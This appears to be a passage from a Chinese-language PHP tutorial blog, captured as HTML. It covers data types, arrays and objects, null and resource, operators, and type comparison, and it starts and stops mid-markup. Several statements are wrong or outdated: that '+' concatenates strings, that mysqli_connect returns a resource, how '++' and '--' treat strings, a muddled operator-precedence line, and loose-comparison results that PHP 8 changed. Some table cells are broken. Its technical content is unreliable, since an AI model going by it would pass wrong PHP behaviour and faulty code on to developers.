class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pi</span> = <span class="number">3.1415926535</span>;</span><br><span class="line"><span class="variable">$approx</span> = <span class="number">22</span>/<span class="number">7</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$pi</span> == <span class="variable">$approx</span>)? <span class="string">&quot;相等&quot;</span> : <span class="string">&quot;不相等&quot;</span>; <span class="comment">// 输出 &quot;不相等&quot; </span></span><br></pre></td></tr></table></figure><p><strong>注意事项</strong>：</p><ol><li>浮点数运算可能产生舍入误差，建议使用 <code>abs($a-$b) &lt; 0.0001</code> 判断近似相等。</li><li>若需高精度计算，可使用 <code>BC Math</code> 或 <code>GMP</code> 扩展库。</li></ol><hr><h3 id="二、整型（Integer）"><a href="#二、整型（Integer）" class="headerlink" title="二、整型（Integer）"></a>二、整型（Integer）</h3><p>整型表示整数，支持十进制、十六进制（<code>0x</code>）、八进制（<code>0</code>）表示。例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$age</span> = <span class="number">25</span>;       <span class="comment">// 十进制</span></span><br><span class="line"><span class="variable">$hex</span> = <span class="number">0x1A</span>;     <span class="comment">// 十六进制（26）</span></span><br><span class="line"><span class="variable">$oct</span> = <span class="number">012</span>;      <span class="comment">// 八进制（10）</span></span><br></pre></td></tr></table></figure><p><strong>关键特性</strong>：<br>• <strong>溢出处理</strong>：超出范围时自动转为浮点型（如 <code>2147483648</code> 会变成 <code>2.147483648E+9</code>）。<br>• <strong>弱类型转换</strong>：字符串 <code>123abc</code> 会被转为整型 <code>123</code>，非数字部分被忽略。</p><hr><h3 id="三、字符串（String）"><a href="#三、字符串（String）" class="headerlink" title="三、字符串（String）"></a>三、字符串（String）</h3><p>字符串由字符序列组成，支持三种定义方式：</p><ol><li><p><strong>单引号</strong>：不解析变量和转义字符（如 <code>&#39;$name&#39;</code> 输出 <code>$name</code>）。</p></li><li><p><strong>双引号</strong>：解析变量（如 <code>&quot;$name&quot;</code> 输出变量值）和转义字符（如 <code>&quot;\n&quot;</code> 表示换行）。</p></li><li><p><strong>Heredoc</strong>：适合多行字符串，通过 <code>&lt;&lt;&lt;标识符</code> 定义，例如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span> = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">&lt;h1&gt;Hello, <span class="subst">&#123;$name&#125;</span>&lt;/h1&gt;</span></span><br><span class="line"><span class="string">EOT</span>;</span><br></pre></td></tr></table></figure><p>标识符需顶格写，结束符与开始符一致。</p></li></ol><p><strong>字符串操作</strong>：<br>• <strong>转义</strong>：反斜杠 <code>\</code> 用于转义单引号、双引号等（如 <code>\&quot;</code> 输出 <code>&quot;</code>）。<br>• **类型转换**：使用 <code>strval()</code> 函数将其他类型转为字符串。</p><hr><h3 id="四、布尔值（bool）-和-NULL"><a href="#四、布尔值（bool）-和-NULL" class="headerlink" title="四、布尔值（bool） 和 NULL"></a>四、<strong>布尔值（<code>bool</code>）</strong> 和 <strong>NULL</strong></h3><p>• <strong>布尔值</strong>：<code>true</code> 或 <code>false</code>，<code>0</code>、<code>&quot;&quot;</code>、<code>null</code> 等值会被隐式转换为 <code>false</code>。<br>• <strong>NULL</strong>：表示无值，可通过 <code>is_null()</code> 检测。</p><h1 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h1><h3 id="一、PHP-数组"><a href="#一、PHP-数组" class="headerlink" title="一、PHP 数组"></a>一、PHP 数组</h3><h4 id="1-数组类型"><a href="#1-数组类型" class="headerlink" title="1. 数组类型"></a>1. <strong>数组类型</strong></h4><p>PHP 支持三种数组类型：<br>• <strong>索引数组</strong>：使用数字键（默认从 0 开始自动递增）</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$colors</span> = [<span class="string">&quot;red&quot;</span>, <span class="string">&quot;green&quot;</span>, <span class="string">&quot;blue&quot;</span>]; <span class="comment">// 简写语法</span></span><br></pre></td></tr></table></figure><p>• <strong>关联数组</strong>：使用字符串键存储键值对</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user</span> = [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;John&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="number">30</span>];</span><br></pre></td></tr></table></figure><p>• <strong>多维数组</strong>：数组嵌套数组，用于复杂数据结构</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$matrix</span> = [</span><br><span class="line">  [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">  [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h4 id="2-数组操作"><a href="#2-数组操作" class="headerlink" title="2. 数组操作"></a>2. <strong>数组操作</strong></h4><p>• <strong>创建</strong>：通过 <code>array()</code> 函数或简写 <code>[]</code> 语法</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fruits</span> = [<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span>]; <span class="comment">// 索引数组</span></span><br><span class="line"><span class="variable">$person</span> = [<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;Tom&quot;</span>, <span class="string">&quot;city&quot;</span> =&gt; <span class="string">&quot;Beijing&quot;</span>]; <span class="comment">// 关联数组</span></span><br></pre></td></tr></table></figure><p>• <strong>增删改查</strong>：<br>  • <strong>添加元素</strong>：<code>$arr[] = &quot;new_element&quot;</code>（末尾追加）或 <code>array_push()</code><br>  • <strong>删除元素</strong>：<code>unset($arr[1])</code><br>  • <strong>遍历</strong>：<code>foreach</code> 循环（推荐）或 <code>for</code> 循环</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$fruits</span> <span class="keyword">as</span> <span class="variable">$fruit</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fruit</span> . <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>• <strong>排序</strong>：<code>sort()</code>（索引数组升序）、<code>rsort()</code>（降序）或 <code>usort()</code>（自定义排序）</p><hr><h3 id="二、PHP-对象"><a href="#二、PHP-对象" class="headerlink" title="二、PHP 对象"></a>二、PHP 对象</h3><h4 id="1-对象定义"><a href="#1-对象定义" class="headerlink" title="1. 对象定义"></a>1. <strong>对象定义</strong></h4><p>• <strong>类与实例化</strong>：通过 <code>class</code> 关键字定义类，<code>new</code> 关键字创建对象</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello, my name is &quot;</span> . <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$person</span> = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>);</span><br></pre></td></tr></table></figure><h4 id="2-对象属性与方法"><a href="#2-对象属性与方法" class="headerlink" title="2. 对象属性与方法"></a>2. <strong>对象属性与方法</strong></h4><p>• <strong>属性</strong>：通过 <code>$this-&gt;属性名</code> 访问和修改</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span>-&gt;name = <span class="string">&quot;Jane&quot;</span>; <span class="comment">// 修改属性</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$person</span>-&gt;age; <span class="comment">// 输出 25</span></span><br></pre></td></tr></table></figure><p>• <strong>方法</strong>：通过对象调用，<code>$this</code> 指向当前实例</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$person</span>-&gt;<span class="title function_ invoke__">sayHello</span>(); <span class="comment">// 输出 &quot;Hello, my name is John&quot;</span></span><br></pre></td></tr></table></figure><h4 id="3-对象数组"><a href="#3-对象数组" class="headerlink" title="3. 对象数组"></a>3. <strong>对象数组</strong></h4><p>• <strong>存储多个对象</strong>：将对象作为数组元素</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$people</span> = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>)</span><br><span class="line">];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$people</span> <span class="keyword">as</span> <span class="variable">$person</span>) &#123;</span><br><span class="line">    <span class="variable">$person</span>-&gt;<span class="title function_ invoke__">sayHello</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="三、关键区别与注意事项"><a href="#三、关键区别与注意事项" class="headerlink" title="三、关键区别与注意事项"></a>三、关键区别与注意事项</h3><ol><li><strong>数组 vs 对象</strong><br>• 数组是数据集合，对象是数据与行为的封装<br>• 数组通过键访问元素，对象通过属性和方法操作数据</li><li><strong>弱类型语言特性</strong><br>PHP 自动转换数据类型，但需注意精度问题（如浮点数比较）</li><li><strong>作用域与访问</strong><br>• 全局变量需用 <code>global</code> 访问，对象属性通过 <code>$this</code> 直接访问<br>• 静态属性&#x2F;方法使用 <code>self::</code> 或 <code>ClassName::</code> 访问</li></ol><h1 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h1><h3 id="一、null-类型"><a href="#一、null-类型" class="headerlink" title="一、null 类型"></a>一、<code>null</code> 类型</h3><h4 id="1-定义与特性"><a href="#1-定义与特性" class="headerlink" title="1. 定义与特性"></a>1. <strong>定义与特性</strong></h4><p>• <strong><code>null</code> 表示变量无值</strong>，既不是空字符串、零，也不是布尔值 <code>false</code>。<br>• <strong>不区分大小写</strong>：<code>NULL</code>、<code>null</code>、<code>NuLL</code> 均等价。<br>• <strong>三种赋值为 <code>null</code> 的场景</strong>：</p><pre><code>1. **显式赋值**：`$var = null;`2. **未初始化变量**：函数内未声明的变量默认为 `null`。3. **显式释放**：通过 `unset($var)` 删除变量。</code></pre><h4 id="2-隐式转换风险"><a href="#2-隐式转换风险" class="headerlink" title="2. 隐式转换风险"></a>2. <strong>隐式转换风险</strong></h4><p>• <strong>算术运算中的陷阱</strong>：<code>null</code> 在运算中会被转换为 <code>0</code>。例如：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>; <span class="comment">// 未初始化，默认为 null</span></span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$a</span> + <span class="variable">$a</span>; <span class="comment">// 相当于 0 + 0，结果为 0</span></span><br></pre></td></tr></table></figure><p>  若代码中出现类似 <code>a + b</code> 的意外结果（如输出 <code>0</code>），需检查变量是否未初始化。</p><h4 id="3-检测方法"><a href="#3-检测方法" class="headerlink" title="3. 检测方法"></a>3. <strong>检测方法</strong></h4><p>• 使用 <code>is_null($var)</code> 判断变量是否为 <code>null</code>。<br>• 通过 <code>isset($var)</code> 检测变量是否已声明且不为 <code>null</code>。</p><h4 id="4-显式释放变量"><a href="#4-显式释放变量" class="headerlink" title="4. 显式释放变量"></a>4. <strong>显式释放变量</strong></h4><p>• 使用 <code>unset($var)</code> 删除变量，此时变量值变为 <code>null</code>，但不影响内存释放（PHP 自动管理）。</p><hr><h3 id="二、resource-类型"><a href="#二、resource-类型" class="headerlink" title="二、resource 类型"></a>二、<code>resource</code> 类型</h3><h4 id="1-定义与用途"><a href="#1-定义与用途" class="headerlink" title="1. 定义与用途"></a>1. <strong>定义与用途</strong></h4><p>• <strong><code>resource</code> 表示外部资源引用</strong>，如数据库连接、文件句柄、图像画布等。<br>• <strong>无法直接操作</strong>，需通过特定函数间接使用（如 <code>mysqli_query()</code> 操作数据库连接）。</p><h4 id="2-生命周期管理"><a href="#2-生命周期管理" class="headerlink" title="2. 生命周期管理"></a>2. <strong>生命周期管理</strong></h4><p>• <strong>自动垃圾回收</strong>：PHP 通过引用计数自动释放不再使用的资源，无需手动关闭。<br>• <strong>手动释放建议</strong>：对长时间运行的脚本（如 CLI 任务），建议显式调用 <code>fclose()</code> 或 <code>mysqli_close()</code> 释放资源。</p><h4 id="3-示例：数据库连接"><a href="#3-示例：数据库连接" class="headerlink" title="3. 示例：数据库连接"></a>3. <strong>示例：数据库连接</strong></h4>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;user&quot;</span>, <span class="string">&quot;pass&quot;</span>, <span class="string">&quot;db&quot;</span>); <span class="comment">// $conn 是 resource 类型</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_resource</span>(<span class="variable">$conn</span>)) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">    <span class="comment">// 操作完成后可显式关闭连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="三、总结与对比"><a href="#三、总结与对比" class="headerlink" title="三、总结与对比"></a>三、总结与对比</h3><table><thead><tr><th>类型</th><th>核心特性</th><th>典型场景</th></tr></thead><tbody><tr><td><strong><code>null</code></strong></td><td>表示无值，参与运算时转为 <code>0</code>，可通过 <code>is_null()</code> 检测</td><td>未初始化变量、显式释放变量</td></tr><tr><td><strong><code>resource</code></strong></td><td>引用外部资源（如数据库、文件），需通过专用函数操作，自动垃圾回收</td><td>数据库连接、文件读写</td></tr></tbody></table><hr><h3 id="四、注意事项"><a href="#四、注意事项" class="headerlink" title="四、注意事项"></a>四、注意事项</h3><ol><li><strong><code>null</code> 的隐式转换</strong>：在运算中可能导致意外结果（如 <code>null + 5</code> 结果为 <code>5</code>），建议初始化变量。</li><li><strong>资源管理</strong>：依赖 PHP 自动垃圾回收机制，但显式释放资源可提升性能。</li></ol><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h3 id="一、算术运算符"><a href="#一、算术运算符" class="headerlink" title="一、算术运算符"></a>一、<strong>算术运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>+</code></td><td>加法</td><td><code>$a + $b</code></td><td>数值相加，字符串拼接</td></tr><tr><td><code>-</code></td><td>减法</td><td><code>$a - $b</code></td><td>数值相减</td></tr><tr><td><code>*</code></td><td>乘法</td><td><code>$a * $b</code></td><td>数值相乘</td></tr><tr><td><code>/</code></td><td>除法</td><td><code>$a / $b</code></td><td>数值相除，结果为浮点数</td></tr><tr><td><code>%</code></td><td>取模（余数）</td><td><code>$a % $b</code></td><td>返回除法的余数</td></tr><tr><td><code>-</code></td><td>取反</td><td><code>-$a</code></td><td>取负数</td></tr></tbody></table><p><strong>注意</strong>：<br>• 除法结果类型：整除返回 <code>int</code>，非整除返回 <code>float</code>。<br>• 取模运算前会将操作数转为整型（如 <code>1.1 % 2</code> → <code>1</code>）。</p><hr><h3 id="二、字符串运算符"><a href="#二、字符串运算符" class="headerlink" title="二、字符串运算符"></a>二、<strong>字符串运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>.</code></td><td>连接符</td><td><code>$a . $b</code></td><td>拼接两个字符串</td></tr><tr><td><code>.=</code></td><td>字符串赋值</td><td><code>$a .= $b</code></td><td>将 <code>$b</code> 拼接到 <code>$a</code> 后</td></tr></tbody></table><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;World&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$b</span>; <span class="comment">// 输出 &quot;Hello World&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="三、比较运算符"><a href="#三、比较运算符" class="headerlink" title="三、比较运算符"></a>三、<strong>比较运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>==</code></td><td>等于</td><td><code>$a == $b</code></td><td>值相等（<strong>不比较类型</strong>）</td></tr><tr><td><code>===</code></td><td>全等</td><td><code>$a === $b</code></td><td>值和类型均相等</td></tr><tr><td><code>!=</code></td><td>不等于</td><td><code>$a != $b</code></td><td>值不等（<strong>不比较类型</strong>）</td></tr><tr><td><code>!==</code></td><td>不全等</td><td><code>$a !== $b</code></td><td>值或类型任一不等</td></tr><tr><td><code>&gt;</code></td><td>大于</td><td><code>$a &gt; $b</code></td><td></td></tr><tr><td><code>&lt;</code></td><td>小于</td><td><code>$a &lt; $b</code></td><td></td></tr><tr><td><code>&gt;=</code></td><td>大于等于</td><td><code>$a &gt;= $b</code></td><td></td></tr><tr><td><code>&lt;=</code></td><td>小于等于</td><td><code>$a &lt;= $b</code></td><td></td></tr></tbody></table><p><strong>类型转换规则</strong>：<br>• 比较数字和字符串时，字符串会被转为数值（如 <code>&quot;123abc&quot; == 123</code> → <code>true</code>）。<br>• 全等运算符 <code>===</code> 严格比较类型（如 <code>1 == &quot;1&quot;</code> → <code>true</code>，但 <code>1 === &quot;1&quot;</code> → <code>false</code>）。</p><hr><h3 id="四、逻辑运算符"><a href="#四、逻辑运算符" class="headerlink" title="四、逻辑运算符"></a>四、<strong>逻辑运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>&amp;&amp;</code></td><td>逻辑与</td><td><code>$a &amp;&amp; $b</code></td><td>两者为 <code>true</code> 时返回 <code>true</code></td></tr><tr><td>&#96;</td><td></td><td>&#96;</td><td>逻辑或</td></tr><tr><td><code>!</code></td><td>逻辑非</td><td><code>!$a</code></td><td>取反</td></tr><tr><td><code>and</code></td><td>逻辑与（低优先级）</td><td><code>$a and $b</code></td><td>同 <code>&amp;&amp;</code>，但优先级更低</td></tr><tr><td><code>or</code></td><td>逻辑或（低优先级）</td><td><code>$a or $b</code></td><td>同 &#96;</td></tr><tr><td><code>xor</code></td><td>异或</td><td><code>$a xor $b</code></td><td>仅一个为 <code>true</code> 时返回 <code>true</code></td></tr></tbody></table><p><strong>优先级</strong>：<code>!</code> &gt; 算术运算符 &gt; <code>*</code> <code>/</code> <code>%</code> &gt; <code>+</code> <code>-</code> &gt; 比较运算符 &gt; <code>&amp;&amp;</code> &gt; <code>||</code>。</p><hr><h3 id="五、数组运算符"><a href="#五、数组运算符" class="headerlink" title="五、数组运算符"></a>五、<strong>数组运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>+</code></td><td>合并</td><td><code>$a + $b</code></td><td>合并数组，重复键保留左侧值</td></tr><tr><td><code>==</code></td><td>相等</td><td><code>$a == $b</code></td><td>数组键值对相等（不比较顺序）</td></tr><tr><td><code>===</code></td><td>全等</td><td><code>$a === $b</code></td><td>键值对、顺序、类型均相等</td></tr></tbody></table><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>];</span><br><span class="line"><span class="variable">$b</span> = [<span class="string">&#x27;c&#x27;</span> =&gt; <span class="number">3</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">4</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$a</span> + <span class="variable">$b</span>; <span class="comment">// 结果 [&#x27;a&#x27; =&gt; 1, &#x27;b&#x27; =&gt; 2, &#x27;c&#x27; =&gt; 3]</span></span><br></pre></td></tr></table></figure><hr><h3 id="六、递增-递减运算符"><a href="#六、递增-递减运算符" class="headerlink" title="六、递增&#x2F;递减运算符"></a>六、<strong>递增&#x2F;递减运算符</strong></h3><table><thead><tr><th>运算符</th><th>名称</th><th>示例</th><th>说明</th></tr></thead><tbody><tr><td><code>++</code></td><td>前递增</td><td><code>++$a</code></td><td>先加1，再返回值</td></tr><tr><td><code>++</code></td><td>后递增</td><td><code>$a++</code></td><td>先返回值，再加1</td></tr><tr><td><code>--</code></td><td>前递减</td><td><code>--$a</code></td><td>先减1，再返回值</td></tr><tr><td><code>--</code></td><td>后递减</td><td><code>$a--</code></td><td>先返回值，再减1</td></tr></tbody></table><p><strong>注意</strong>：对布尔值、<code>null</code> 或字符串操作时，直接转为整型 <code>0</code> 后计算。</p><hr><h3 id="七、三元运算符"><a href="#七、三元运算符" class="headerlink" title="七、三元运算符"></a>七、<strong>三元运算符</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$condition</span> ? <span class="variable">$value_if_true</span> : <span class="variable">$value_if_false</span>;</span><br></pre></td></tr></table></figure><p><strong>简写形式（PHP 5.3+）</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$condition</span> ?: <span class="variable">$default</span>; <span class="comment">// 若 $condition 为真，返回 $condition，否则返回 $default</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="comment">// 简写为：$username = $_GET[&#x27;user&#x27;] ?? &#x27;guest&#x27;; （PHP 7+）</span></span><br></pre></td></tr></table></figure><hr><h3 id="八、太空船操作符（PHP-7-）"><a href="#八、太空船操作符（PHP-7-）" class="headerlink" title="八、太空船操作符（PHP 7+）"></a>八、<strong>太空船操作符（PHP 7+）</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$a</span> &lt;=&gt; <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><p><strong>返回值</strong>：<br>• <code>-1</code>：若 <code>$a &lt; $b</code><br>• <code>0</code>：若 <code>$a == $b</code><br>• <code>1</code>：若 <code>$a &gt; $b</code></p><p><strong>用途</strong>：简化比较逻辑（如排序）。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$array</span>, function(<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> &lt;=&gt; <span class="variable">$b</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><table><thead><tr><th>优先级</th><th>运算符类型</th><th>示例</th></tr></thead><tbody><tr><td>最高</td><td>括号、函数调用、属性访问</td><td><code>($a + $b) * $c</code></td></tr><tr><td>高</td><td>一元运算符（<code>++</code>, <code>!</code>）</td><td><code>++$a + !$b</code></td></tr><tr><td>中</td><td>算术运算符（<code>*</code>, <code>/</code>）</td><td><code>$a * $b + $c</code></td></tr><tr><td>低</td><td>比较运算符（<code>==</code>, <code>&lt;</code>）</td><td><code>$a == $b &amp;&amp; $c &lt; $d</code></td></tr><tr><td>最低</td><td>逻辑运算符（<code>&amp;&amp;</code>, &#96;</td><td></td></tr></tbody></table><hr><h1 id="类型比较"><a href="#类型比较" class="headerlink" title="类型比较"></a>类型比较</h1><h4 id="一、类型比较的两种模式"><a href="#一、类型比较的两种模式" class="headerlink" title="一、类型比较的两种模式"></a>一、<strong>类型比较的两种模式</strong></h4><table><thead><tr><th>比较类型</th><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td><strong>松散比较</strong></td><td><code>==</code></td><td>只比较值，不比较类型（会触发隐式类型转换）</td></tr><tr><td><strong>严格比较</strong></td><td><code>===</code></td><td>比较值和类型，两者均需相等才返回 <code>true</code></td></tr></tbody></table><hr><h4 id="二、松散比较（-）"><a href="#二、松散比较（-）" class="headerlink" title="二、松散比较（==）"></a>二、<strong>松散比较（<code>==</code>）</strong></h4><p>PHP 在松散比较时会自动转换类型，以下为常见转换逻辑：</p><ol><li><p><strong>布尔类型与其他类型比较</strong>：<br>• <code>false</code> 会被转换为 <code>0</code>，<code>true</code> 转换为 <code>1</code>。<br>• 其他类型转为布尔值时：<code>0</code>、<code>null</code>、空字符串 <code>&quot;&quot;</code>、空数组 <code>[]</code> 转换为 <code>false</code>，其余为 <code>true</code>。</p></li><li><p><strong>字符串与数比较</strong>：<br>• 字符串会被解析为数值进行比较（如 <code>&quot;42&quot; == 42</code> → <code>true</code>，但 <code>&quot;hello&quot; == 0</code> → <code>true</code>）。</p></li><li><p><strong><code>null</code> 的特殊处理</strong>：<br>• <code>null</code> 仅与 <code>null</code> 或未定义变量相等（<code>null == null</code> → <code>true</code>）。<br>• 与其他类型比较时，<code>null</code> 转为 <code>false</code>（如 <code>null == false</code> → <code>true</code>）。</p></li><li><p><strong>数组与标量比较</strong>：<br>• 数组与标量（如整数、字符串）比较时，直接返回 <code>false</code>。<br>• 空数组 <code>[]</code> 与 <code>false</code> 相等（<code>[] == false</code> → <code>true</code>）。</p></li></ol><hr><h4 id="三、严格比较（-）"><a href="#三、严格比较（-）" class="headerlink" title="三、严格比较（===）"></a>三、<strong>严格比较（<code>===</code>）</strong></h4><p>• <strong>值和类型必须完全一致</strong>：</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">42</span> === <span class="string">&quot;42&quot;</span>); <span class="comment">// false（类型不同）</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">true</span> === <span class="number">1</span>);  <span class="comment">// false（类型不同）</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">null</span> === []); <span class="comment">// false（类型不同）</span></span><br></pre></td></tr></table></figure><p>• <strong>数组比较</strong>：<br>  • 结构和键值对均相同才返回 <code>true</code>（顺序敏感）：<br>    <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>];</span><br><span class="line"><span class="variable">$b</span> = [<span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">1</span>];</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span> === <span class="variable">$b</span>); <span class="comment">// false（顺序不同）</span></span><br></pre></td></tr></table></figure></p><hr><h4 id="四、常见类型比较陷阱"><a href="#四、常见类型比较陷阱" class="headerlink" title="四、常见类型比较陷阱"></a>四、<strong>常见类型比较陷阱</strong></h4><table><thead><tr><th>示例</th><th>松散比较结果</th><th>严格比较结果</th><th>原因</th></tr></thead><tbody><tr><td><code>&quot;&quot; == false</code></td><td><code>true</code></td><td><code>false</code></td><td>空字符串转为 <code>false</code></td></tr><tr><td><code>&quot;0&quot; == false</code></td><td><code>true</code></td><td><code>false</code></td><td>字符串 <code>&quot;0&quot;</code> 转为 <code>0</code></td></tr><tr><td><code>&quot;hello&quot; == 0</code></td><td><code>true</code></td><td><code>false</code></td><td>非数字字符串转为 <code>0</code></td></tr><tr><td><code>[] == false</code></td><td><code>true</code></td><td><code>false</code></td><td>空数组转为 <code>false</code></td></tr><tr><td><code>null == []</code></td><td><code>true</code></td><td><code>false</code></td><td><code>null</code> 和空数组均转为 <code>false</code></td></tr><tr><td><code>&quot;123abc&quot; == 123</code></td><td><code>true</code></td><td><code>false</code></td><td>字符串解析为数值 <code>123</code></td></tr></tbody></table><hr><h4 id="五、类型比较实战技巧"><a href="#五、类型比较实战技巧" class="headerlink" title="五、类型比较实战技巧"></a>五、<strong>类型比较实战技巧</strong></h4><ol><li><p><strong>优先使用严格比较</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$userInput</span> === <span class="number">123</span>) &#123; <span class="comment">/* 避免字符串 &quot;123&quot; 被误判 */</span> &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>显式类型转换</strong>：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="variable">$num</span> = (<span class="keyword">int</span>)<span class="variable">$str</span>; <span class="comment">// 显式转为整数</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span> === <span class="number">123</span>); <span class="comment">// 